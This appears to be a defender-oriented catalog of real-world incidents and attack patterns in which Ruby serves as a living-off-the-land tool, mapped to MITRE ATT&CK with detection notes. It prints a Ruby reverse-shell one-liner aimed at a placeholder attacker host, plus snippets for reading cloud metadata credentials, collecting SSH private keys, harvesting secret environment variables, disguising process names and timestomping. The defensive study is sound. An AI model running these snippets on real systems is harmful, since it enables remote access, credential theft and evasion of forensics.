# LoLRuby Real-World Examples

## Overview

This document catalogs real-world incidents, vulnerability disclosures, and documented
attack patterns where Ruby was used as a Living-off-the-Land tool. These examples
demonstrate why understanding LoLRuby techniques is critical for defenders.

---

## 1. Supply Chain Attacks via RubyGems

### rest-client Gem Compromise (August 2019)
- **MITRE ATT&CK**: T1195.001 (Supply Chain Compromise: Software Dependencies)
- **LoLRuby Relevance**: LR-P-003 (Gem Backdoor), LR-C-005 (Environment Secrets)
- **Description**: The popular `rest-client` gem (100M+ downloads) was compromised after
  the maintainer's RubyGems account was hijacked. Malicious versions (1.6.13) collected
  environment variables, host information, and exfiltrated them via HTTP POST.
- **Ruby Techniques Used**:
  - `ENV.to_h` for credential harvesting
  - `Net::HTTP.post` for data exfiltration
  - Gem install hooks for execution persistence
- **Detection Gap**: The malicious code used only stdlib Ruby — no suspicious binaries.
- **Reference**: https://github.com/rest-client/rest-client/issues/713

### bootstrap-sass Gem Backdoor (April 2019)
- **MITRE ATT&CK**: T1195.001, T1059
- **LoLRuby Relevance**: LR-P-003, LR-X-001 (Eval Execution)
- **Description**: The `bootstrap-sass` gem was compromised to include a cookie-triggered
  remote code execution backdoor using `eval` on user-controlled input.
- **Ruby Techniques Used**:
  - `eval()` on decoded cookie data for arbitrary code execution
  - Rack middleware injection for request interception
- **Detection Gap**: The backdoor was dormant until triggered by a specific cookie value.
- **Reference**: https://github.com/twbs/bootstrap-sass/issues/1195

### strong_password Gem Compromise (June 2019)
- **MITRE ATT&CK**: T1195.001, T1041
- **LoLRuby Relevance**: LR-X-001, LR-E-002
- **Description**: Malicious code was injected into `strong_password` gem version 0.0.7
  that fetched and eval'd remote code from pastebin.
- **Ruby Techniques Used**:
  - `Net::HTTP.get` to fetch remote payload
  - `eval()` to execute fetched code
  - `Kernel.open` for URL-based code loading
- **Reference**: https://withatwist.dev/strong-password-gem-hijacked.html

---

## 2. Ruby-Based Exploitation in Web Applications

### Rails Remote Code Execution (CVE-2019-5420, CVE-2013-0156)
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **LoLRuby Relevance**: LR-X-001, LR-X-008 (ERB Template Exec)
- **Description**: Multiple Rails vulnerabilities allowed remote code execution through
  YAML deserialization and development mode secret token guessing.
- **Ruby Techniques Used**:
  - `YAML.load` for object deserialization leading to code execution
  - `ERB.new(payload).result` for template injection
  - `Marshal.load` for arbitrary object instantiation
- **Lesson**: Ruby's dynamic features (YAML/Marshal deserialization) are attack vectors.

### Puppet Server Exploitation
- **MITRE ATT&CK**: T1072 (Software Deployment Tools)
- **LoLRuby Relevance**: LR-X-001, LR-P-001
- **Description**: Compromised Puppet servers have been used to distribute malicious
  Ruby code across managed infrastructure. Since Puppet is Ruby-based, attackers can
  leverage Ruby's standard library on every managed node.
- **Ruby Techniques Used**:
  - `system()` calls within Puppet custom functions
  - `File.write` for configuration modification
  - Ruby-based persistence via Puppet's own scheduling mechanism

---

## 3. Post-Exploitation Frameworks Using Ruby

### Metasploit Framework
- **LoLRuby Relevance**: All categories
- **Description**: Metasploit is entirely Ruby-based and represents the most comprehensive
  example of Ruby used for security operations. Its post-exploitation modules demonstrate
  virtually every LoLRuby technique.
- **Notable Ruby Patterns**:
  - Meterpreter payloads use Ruby socket operations
  - Auxiliary modules use `Net::HTTP`, `TCPSocket` for scanning
  - Post modules use `File.read`, `Dir.glob` for data collection
  - Encoders use Ruby's `pack`/`unpack` for payload transformation

### Ronin (Ruby Security Toolkit)
- **LoLRuby Relevance**: Reconnaissance, Execution, Exfiltration
- **Description**: Ronin is a Ruby platform for security research that provides
  pure-Ruby implementations of scanning, exploitation, and payload generation.
- **Notable**: Demonstrates that Ruby alone is sufficient for full attack lifecycle.

---

## 4. Ruby One-Liner Attacks in the Wild

### Reverse Shell via ruby -e
- **MITRE ATT&CK**: T1059.002
- **LoLRuby Relevance**: LR-X-003, LR-X-004
- **Observed Context**: Frequently seen in web application exploitation where command
  injection is possible and Ruby is installed on the target.
- **Pattern**: `ruby -e 'require "socket";f=TCPSocket.open("ATTACKER",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
- **Detection**: Monitor for `ruby -e` with socket operations in process arguments.

### Data Exfiltration via DNS
- **MITRE ATT&CK**: T1048.003
- **LoLRuby Relevance**: LR-E-001
- **Observed Context**: APT groups have used scripting language DNS exfiltration when
  HTTP egress is blocked.
- **Pattern**: Encode data in DNS subdomain queries using Ruby's `Resolv` library.
- **Detection**: Monitor for high volumes of DNS queries with encoded-looking subdomains.

---

## 5. Cloud Environment Exploitation

### SSRF to Cloud Metadata
- **MITRE ATT&CK**: T1552.005 (Cloud Instance Metadata API)
- **LoLRuby Relevance**: LR-R-006
- **Observed Context**: Ruby web applications vulnerable to SSRF have been exploited
  to access cloud metadata services and steal IAM credentials.
- **Ruby Techniques Used**:
  - `Net::HTTP.get(URI('http://169.254.169.254/latest/meta-data/'))` in SSRF chains
  - `JSON.parse` to extract IAM credential tokens
- **Notable Incident**: Capital One breach (2019) involved metadata service access
  (though via curl, the same technique is trivially portable to Ruby).

### Container Escape via Ruby
- **MITRE ATT&CK**: T1611 (Escape to Host)
- **LoLRuby Relevance**: LR-X-004, LR-R-005
- **Observed Context**: Ruby applications in Docker containers with excessive privileges.
- **Ruby Techniques Used**:
  - `File.read('/proc/1/cgroup')` to detect container environment
  - `Dir.glob('/var/run/docker.sock')` to find mounted Docker socket
  - `Net::HTTP` via Unix socket to Docker API for container escape

---

## 6. Credential Harvesting Campaigns

### SSH Key Collection
- **MITRE ATT&CK**: T1552.004
- **LoLRuby Relevance**: LR-C-004
- **Observed Context**: Post-exploitation scripts that collect SSH keys for lateral movement.
- **Ruby Pattern**: `Dir.glob('/home/*/.ssh/id_*').reject{|f| f.end_with?('.pub')}`
- **Lesson**: Ruby can silently enumerate and read SSH keys without triggering file
  access auditing on most default configurations.

### Environment Variable Harvesting
- **MITRE ATT&CK**: T1552.001
- **LoLRuby Relevance**: LR-C-005, LR-R-005
- **Observed Context**: CI/CD environments where secrets are passed as environment variables.
- **Ruby Pattern**: `ENV.select { |k,_| k =~ /KEY|SECRET|TOKEN|PASS|API|AUTH/i }`
- **Lesson**: Environment variables are the most common location for secrets in
  containerized and cloud-native applications.

---

## 7. Defense Evasion in Practice

### Process Name Masquerading
- **MITRE ATT&CK**: T1036.004
- **LoLRuby Relevance**: LR-D-003
- **Observed Context**: Malicious Ruby scripts setting `$0` to appear as system processes.
- **Ruby Pattern**: `$0 = '[kworker/0:1-events]'` to mimic a kernel worker thread.
- **Detection Challenge**: `ps` output shows the masqueraded name; only `/proc/PID/exe`
  symlink reveals the true binary.

### Timestomping Forensic Evasion
- **MITRE ATT&CK**: T1070.006
- **LoLRuby Relevance**: LR-D-002
- **Observed Context**: After file modification, attackers restore original timestamps.
- **Ruby Pattern**: `File.utime(original_atime, original_mtime, modified_file)`
- **Detection**: Compare `mtime` with filesystem journal entries or inode change time (`ctime`).

---

## Key Takeaways for Defenders

1. **Ruby's standard library is a complete attack toolkit** — No additional downloads needed.
2. **Supply chain is the largest real-world LoLRuby vector** — Gem compromises affect millions.
3. **One-liners bypass script-based detection** — No file touches disk.
4. **Process monitoring must include interpreter arguments** — Watch `ruby -e` closely.
5. **Environment variables are high-value targets** — Audit access to `ENV` in Ruby processes.
6. **Cloud metadata access via Ruby is trivial** — Block IMDS v1, enforce IMDSv2 with hop limit.
7. **Ruby's eval variants are the most dangerous feature** — Consider Ruby's `--disable-gems`
   and `$SAFE` (deprecated but historically relevant) for restricted environments.
